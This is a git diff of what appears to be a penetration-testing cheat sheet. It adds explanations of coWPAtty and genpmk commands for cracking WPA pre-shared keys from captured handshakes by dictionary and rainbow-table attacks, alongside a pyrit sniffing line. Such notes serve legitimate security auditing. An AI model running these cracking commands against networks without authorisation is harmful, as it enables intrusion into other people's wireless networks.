@@ -202,13 +202,36 @@ This attack is used for bypassing WEP Share Key Authentication.  It uses a captu
 ## WPA Attacks
 
 #### coWPAtty Attack 
+
+##### Dictionary Mode
+
+coWPAtty is a versatile tool that can recover WPA pre-shared keys, from a captured handshake, using either dictionary or rainbow table attacks.
+
 > `cowpatty -r <capture> -f <wordlist> -2 -s <essid>`
 
-#### Rainbow Table Generation
+* `-r <capture>` - The capture filename
+* `-f <wordlist>` - The wordlist to use
+* `-2` - Use non-strict mode as coWPAtty has an issue with airodump-ng captures
+* `-s <essid> - The network ESSID
+
+##### Rainbow Table Mode
+
+Generate the hashes for our ESSID along with a dictionary file containing password
+
 > `genpmk -f <wordlist> -d <hashesFilename> -s <essid>`
 
-#### Rainbow Table coWPAtty Attack
+* `-f <wordlist>` - The path to the dictionary file
+* `-d <hashesFilename>` - The filename to save the computed hashes to
+* `-s <essid>` - The network ESSID
+
+Run coWPAtty using the generated hashes
+
 > `cowpatty -r <capture> -d <hashesFilename> -2 -s <essid>`
+
+* `-r <capture>` - The capture filename
+* `-d <hashesFilename>` - The file name of the computed hashes to use
+* `-2` - Use non-strict mode as coWPAtty has an issue with airodump-ng captures
+* `-s <essid>` - The network ESSID
 
 #### Pyrit Sniff
 > `pyrit -r <interface> -o <capture> stripLive`
